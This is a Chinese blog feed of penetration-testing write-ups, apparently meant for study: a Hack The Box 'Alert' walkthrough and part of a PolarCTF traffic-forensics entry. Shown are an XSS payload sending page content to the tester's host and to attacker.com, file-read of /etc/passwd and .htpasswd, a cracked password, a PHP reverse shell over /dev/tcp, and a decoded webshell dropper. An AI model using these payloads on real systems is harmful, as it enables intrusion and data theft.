class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;css/style.css&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Alert - Markdown Viewer<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index.php?page=alert&quot;</span>&gt;</span>Markdown Viewer<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index.php?page=contact&quot;</span>&gt;</span>Contact Us<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index.php?page=about&quot;</span>&gt;</span>About Us<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index.php?page=donate&quot;</span>&gt;</span>Donate<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Markdown Viewer<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-container&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;visualizer.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">accept</span>=<span class="hljs-string">&quot;.md&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;View Markdown&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: black;&quot;</span>&gt;</span>?2024 Alert. All rights reserved.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åè¯•è¯• <code>message.php</code> é¡µé¢</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://alert.htb/messages.php&quot;</span>)<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">text</span>())<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://10.10.16.15:1234/?file_content=&quot;</span> + <span class="hljs-built_in">encodeURIComponent</span>(data));&#125;);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/253675b58065147a.png"></p><p>è¿›è¡Œ URL è§£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">%3Ch1%3EMessages%3C%2Fh1%3E%3Cul%3E%3Cli%3E%3Ca%20href%3D%27messages.<span class="hljs-property">php</span>%3Ffile%3D2024-<span class="hljs-number">03</span>-<span class="hljs-number">10_15</span>-<span class="hljs-number">48</span>-<span class="hljs-number">34.</span>txt%<span class="hljs-number">27</span>%<span class="hljs-number">3E2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">10_15</span>-<span class="hljs-number">48</span>-<span class="hljs-number">34.</span>txt%3C%2Fa%3E%3C%2Fli%3E%3C%2Ful%3E%0A<br>:<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Messages<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;messages.php?file=2024-03-10_15-48-34.txt&#x27;</span>&gt;</span>2024-03-10_15-48-34.txt<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>æ¥å—äº†ä¸€ä¸ª <code>file</code> å‚æ•°ï¼Œé‚£ä¹ˆåƒå‰é¢ä¸€æ ·å»è¯»å–ä¸€ä¸‹ <code>/etc/passwd</code> </p><p><img src="https://img.dkdun.cn/v1/2025/12/d0c5fa159375f6d1.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;pre&gt;root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin<br>syslog:x:104:110::/home/syslog:/usr/sbin/nologin<br>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin<br>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false<br>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin<br>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin<br>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin<br>pollinate:x:110:1::/var/cache/pollinate:/bin/false<br>fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin<br>usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin<br>sshd:x:113:65534::/run/sshd:/usr/sbin/nologin<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>albert:x:1000:1000:albert:/home/albert:/bin/bash<br>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false<br>david:x:1001:1002:,,,:/home/david:/bin/bash<br>&lt;/pre&gt;<br></code></pre></td></tr></table></figure><p>è¯»å– <code>/etc/hosts</code> æ–‡ä»¶ï¼Œå¾—åˆ°äº†å­åŸŸ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;pre&gt;<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> localhost<br><span class="hljs-number">127.0</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> alert<br><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> alert.<span class="hljs-property">htb</span><br><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> statistics.<span class="hljs-property">alert</span>.<span class="hljs-property">htb</span><br><br># <span class="hljs-title class_">The</span> following lines are desirable <span class="hljs-keyword">for</span> <span class="hljs-title class_">IPv6</span> capable hosts<br>::<span class="hljs-number">1</span>     ip6-localhost ip6-loopback<br><span class="hljs-attr">fe00</span>::<span class="hljs-number">0</span> ip6-localnet<br><span class="hljs-attr">ff00</span>::<span class="hljs-number">0</span> ip6-mcastprefix<br><span class="hljs-attr">ff02</span>::<span class="hljs-number">1</span> ip6-allnodes<br><span class="hljs-attr">ff02</span>::<span class="hljs-number">2</span> ip6-allrouters<br>&lt;/pre&gt;<br></code></pre></td></tr></table></figure><p>è®¿é—® <code>statistics.alert.htb</code> å‘ç°éœ€è¦å¯†ç ç™»å½•</p><p><img src="https://img.dkdun.cn/v1/2025/12/69f8231413bdb109.png"></p><p>ç½‘ç«™æ˜¯ Apache æœåŠ¡å™¨ï¼Œè¯»å–å®ƒçš„é…ç½®æ–‡ä»¶ <code>/etc/apache2/sites-available/000-default.conf</code></p><p><a href="https://daolgts.github.io/2019/03/08/%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%90%9C%E9%9B%86/">æ•æ„Ÿæ–‡ä»¶æœé›†</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/f73ee8d2d16630ec.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;pre&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">VirtualHost</span> *<span class="hljs-attr">:80</span>&gt;</span></span><br><span class="language-xml">    ServerName alert.htb</span><br><span class="language-xml"></span><br><span class="language-xml">    DocumentRoot /var/www/alert.htb</span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Directory</span> /<span class="hljs-attr">var</span>/<span class="hljs-attr">www</span>/<span class="hljs-attr">alert.htb</span>&gt;</span></span><br><span class="language-xml">        Options FollowSymLinks MultiViews</span><br><span class="language-xml">        AllowOverride All</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Directory</span>&gt;</span></span><br><br>    <span class="hljs-title class_">RewriteEngine</span> <span class="hljs-title class_">On</span><br>    <span class="hljs-title class_">RewriteCond</span> %&#123;<span class="hljs-variable constant_">HTTP_HOST</span>&#125; !^alert\.<span class="hljs-property">htb$</span><br>    <span class="hljs-title class_">RewriteCond</span> %&#123;<span class="hljs-variable constant_">HTTP_HOST</span>&#125; !^$<br>    <span class="hljs-title class_">RewriteRule</span> ^<span class="hljs-regexp">/?(.*)$ http:/</span><span class="hljs-regexp">/alert.htb/</span>$1 [R=<span class="hljs-number">301</span>,L]<br><br>    <span class="hljs-title class_">ErrorLog</span> $&#123;<span class="hljs-variable constant_">APACHE_LOG_DIR</span>&#125;/error.<span class="hljs-property">log</span><br>    <span class="hljs-title class_">CustomLog</span> $&#123;<span class="hljs-variable constant_">APACHE_LOG_DIR</span>&#125;/access.<span class="hljs-property">log</span> combined<br>&lt;/<span class="hljs-title class_">VirtualHost</span>&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">VirtualHost</span> *<span class="hljs-attr">:80</span>&gt;</span></span><br><span class="language-xml">    ServerName statistics.alert.htb</span><br><span class="language-xml"></span><br><span class="language-xml">    DocumentRoot /var/www/statistics.alert.htb</span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Directory</span> /<span class="hljs-attr">var</span>/<span class="hljs-attr">www</span>/<span class="hljs-attr">statistics.alert.htb</span>&gt;</span></span><br><span class="language-xml">        Options FollowSymLinks MultiViews</span><br><span class="language-xml">        AllowOverride All</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Directory</span>&gt;</span></span><br><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Directory</span> /<span class="hljs-attr">var</span>/<span class="hljs-attr">www</span>/<span class="hljs-attr">statistics.alert.htb</span>&gt;</span></span><br>        <span class="hljs-title class_">Options</span> <span class="hljs-title class_">Indexes</span> <span class="hljs-title class_">FollowSymLinks</span> <span class="hljs-title class_">MultiViews</span><br>        <span class="hljs-title class_">AllowOverride</span> <span class="hljs-title class_">All</span><br>        <span class="hljs-title class_">AuthType</span> <span class="hljs-title class_">Basic</span><br>        <span class="hljs-title class_">AuthName</span> <span class="hljs-string">&quot;Restricted Area&quot;</span><br>        <span class="hljs-title class_">AuthUserFile</span> /<span class="hljs-keyword">var</span>/www/statistics.<span class="hljs-property">alert</span>.<span class="hljs-property">htb</span>/.<span class="hljs-property">htpasswd</span><br>        <span class="hljs-title class_">Require</span> valid-user<br>    &lt;/<span class="hljs-title class_">Directory</span>&gt;<br><br>    <span class="hljs-title class_">ErrorLog</span> $&#123;<span class="hljs-variable constant_">APACHE_LOG_DIR</span>&#125;/error.<span class="hljs-property">log</span><br>    <span class="hljs-title class_">CustomLog</span> $&#123;<span class="hljs-variable constant_">APACHE_LOG_DIR</span>&#125;/access.<span class="hljs-property">log</span> combined<br>&lt;/<span class="hljs-title class_">VirtualHost</span>&gt;<br><br>&lt;/pre&gt;<br><br></code></pre></td></tr></table></figure><p>æ ¹æ®é…ç½®æ–‡ä»¶ä¿¡æ¯å»è¯»å– <code>/var/www/statistics.alert.htb/.htpasswd</code> æ–‡ä»¶</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">&lt;pre&gt;albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/<br>&lt;/pre&gt;<br></code></pre></td></tr></table></figure><p>URL è§£ç åè¿˜æœ‰ä¸€å±‚åŠ å¯†ï¼Œjohn ç ´è§£</p><p><img src="https://img.dkdun.cn/v1/2025/12/3a7eea225b64bd2f.png"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">albert:</span>manchesterunited<br></code></pre></td></tr></table></figure><p>å°è¯•ç›´æ¥ç™»å½•</p><p><img src="https://img.dkdun.cn/v1/2025/12/8ca88f89e7a9c453.png"></p><p>å•¥æœ‰ç”¨çš„éƒ½æ²¡æœ‰ï¼Œssh ç™»å½•ï¼Œæ‹¿åˆ° user flag</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">59e3b7beba7b4b3802988ebd8f91fb26<br></code></pre></td></tr></table></figure><h1 id="Submit-Root-Flag"><a href="#Submit-Root-Flag" class="headerlink" title="Submit Root Flag"></a>Submit Root Flag</h1><p>å‘ç°è¿˜å­˜åœ¨å¦ä¸€ä¸ªç”¨æˆ· <code>david</code>ï¼Œä½†æ˜¯æ²¡ç”¨æƒé™è®¿é—®ï¼Œæ²¡å•¥ç”¨</p><p><img src="https://img.dkdun.cn/v1/2025/12/97f3bf1648cbf020.png"></p><p>å‘ç°å¼€æ”¾äº† 8080 ç«¯å£</p><p><img src="https://img.dkdun.cn/v1/2025/12/ad79cd5bd4150414.png"></p><p>ä¹Ÿæ²¡ç”¨ï¼ŒæŸ¥çœ‹è¿›ç¨‹å‘ç° <code>/opt</code> ä¸‹çš„ <code>website-monitor</code> æœ‰ root æƒé™è¿è¡Œ</p><p><img src="https://img.dkdun.cn/v1/2025/12/d8f23e385ec58629.png"></p><p>åœ¨ <code>/opt/website-monitor/config</code> å†™å…¥ä¸€ä¸ª shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;/dev/tcp/10.10.16.15/1234 0&gt;&amp;1&#x27;&quot;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è®¿é—® <code>http://127.0.0.1:8080/config/shell.php</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/e5acbc7d64eee663.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/f354fb3d5fb5a7c6.png"></p><p>æ‹¿åˆ° root flag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">c</span><span class="hljs-number">586</span>ada<span class="hljs-number">87358</span>a<span class="hljs-number">165</span>d<span class="hljs-number">65</span>bfc<span class="hljs-number">94</span>a<span class="hljs-number">6</span>bc<span class="hljs-number">4459</span><br></code></pre></td></tr></table></figure><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/xss/#steal-contents-of-restricted-pages-or-files">https://exploit-notes.hdks.org/exploit/web/security-risk/xss/#steal-contents-of-restricted-pages-or-files</a></p><p>å¦‚æœ JavaScript ä»£ç å¯ä»¥é€šè¿‡ XSS æ‰§è¡Œï¼Œæˆ‘ä»¬å°±å¯ä»¥è®©å—å®³è€…è·å–å—é™é¡µé¢çš„å†…å®¹å¹¶å°†å…¶å‘é€åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;/secret&quot;</span>)<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">resp</span> =&gt;</span> resp.<span class="hljs-title function_">text</span>())<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> &#123;<br>            <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`http://attacker.com/?text=<span class="hljs-subst">$&#123;btoa(text)&#125;</span>`</span>);<br>        &#125;)<br>        .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> &#123;<br>            <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`http://attacker.com/?err=<span class="hljs-subst">$&#123;err&#125;</span>`</span>);<br>        &#125;);<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PolarCTF2025æ˜¥å­£ä¸ªäººæŒ‘æˆ˜èµ›-Misc</title>
    <link href="/2025/03/23/PolarCTF%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B-Misc/"/>
    <url>/2025/03/23/PolarCTF%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B-Misc/</url>
    
    <content type="html"><![CDATA[<p>ä¸¤ä¸ªç®€å•çš„å–è¯</p><span id="more"></span><h1 id="pfsense"><a href="#pfsense" class="headerlink" title="pfsense"></a>pfsense</h1><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-number">1</span>ã€ä»æµé‡æ•°æ®åŒ…ä¸­æ‰¾å‡ºæ”»å‡»è€…åˆ©ç”¨æ¼æ´å¼€å±•æ”»å‡»çš„ä¼šè¯ï¼Œå†™å‡ºå…¶ä¸­æ”»å‡»è€…æ‰§è¡Œçš„å‘½ä»¤ä¸­è®¾ç½®çš„<span class="hljs-built_in">flag</span>å†…å®¹<br><span class="hljs-number">2</span>ã€æ”»å‡»è€…é€šè¿‡æ¼æ´åˆ©ç”¨è·å–è®¾å¤‡æ§åˆ¶æƒé™ï¼Œç„¶åæŸ¥æ‰¾è®¾å¤‡ä¸Šçš„<span class="hljs-built_in">flag</span>æ–‡ä»¶ï¼Œå†™å‡º<span class="hljs-built_in">flag</span>çš„æ–‡ä»¶å†…å®¹<br><span class="hljs-number">3</span>ã€æ‰¾å‡ºå¹¶æäº¤å—æ§æœºè®¾å¤‡ä¸­æ™®é€šç”¨æˆ·çš„IPsecé¢„å…±äº«å¯†é’¥<br></code></pre></td></tr></table></figure><h2 id="pfsense1"><a href="#pfsense1" class="headerlink" title="pfsense1"></a>pfsense1</h2><p>Wireshark è¿‡æ»¤ http æµé‡ï¼Œæ‰¾åˆ°äº†æ”»å‡»ä¼šè¯</p><p><img src="https://img.dkdun.cn/v1/2025/12/30cc3def4e54dc7d.png"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">PD<span class="hljs-number">8</span>kYT<span class="hljs-number">1</span>mb<span class="hljs-number">3</span>BlbigiL<span class="hljs-number">3</span>Vzci<span class="hljs-number">9</span>sb<span class="hljs-number">2</span><span class="hljs-symbol">NhbC93</span>d<span class="hljs-number">3</span>c<span class="hljs-attr">vc3</span>lzdGVtX<span class="hljs-number">2</span>FkdmFuY<span class="hljs-number">2</span>VkX<span class="hljs-number">2</span><span class="hljs-symbol">NvbnRyb2</span>wucGhwIiwidyIpI<span class="hljs-name">G9</span>yIGRpZSgpOyR<span class="hljs-number">0</span>PSc<span class="hljs-number">8</span>P<span class="hljs-number">3</span>BocCBwcmludChwYX<span class="hljs-symbol">NzdGhydSggJF9</span>HRVRbImMiXSkpOz<span class="hljs-number">8</span>+Jztmd<span class="hljs-number">3</span>JpdGUoJGEsJHQp<span class="hljs-meta">O2</span>Zjb<span class="hljs-name">G9</span>zZSggJGEpOz<span class="hljs-number">8</span>+ZmxhZ<span class="hljs-number">3</span>tjOTMwYTIw<span class="hljs-symbol">NzI5</span>Y<span class="hljs-number">2</span>Q<span class="hljs-number">3</span>MTBjOWFjMmUxYm<span class="hljs-symbol">NkMzY4</span><span class="hljs-symbol">NTZlNX0</span>=<br></code></pre></td></tr></table></figure><p>base64 è§£ç ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;/usr/local/www/system_advanced_control.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>();<span class="hljs-variable">$t</span>=<span class="hljs-string">&#x27;&lt;?php print(passthru( $_GET[&quot;c&quot;]));?&gt;&#x27;</span>;<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$t</span>);<span class="hljs-title function_ invoke__">fclose</span>( <span class="hljs-variable">$a</span>);<span class="hljs-meta">?&gt;</span>flag&#123;c930a20729cd710c9ac2e1bcd36856e5&#125;<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ° flag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag&#123;<span class="hljs-keyword">c</span><span class="hljs-number">930</span>a<span class="hljs-number">20729</span>cd<span class="hljs-number">710</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>ac<span class="hljs-number">2e1</span>bcd<span class="hljs-number">36856e5</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="pfsense2"><a href="#pfsense2" class="headerlink" title="pfsense2"></a>pfsense2</h2><p>å¯ä»¥çœ‹åˆ°æ”»å‡»è€…æ‰§è¡Œäº† <code>ls -al</code> å‘½ä»¤</p><p><img src="https://img.dkdun.cn/v1/2025/12/5db2396b294b7fd7.png"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.139.2.139/system_advanced_control.php?c=ls -al<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ddc0a613b7a0b1a2.png"></p><p>æŒ‰ç…§ä¼šè¯æ˜¾ç¤ºä¸Šä¼ 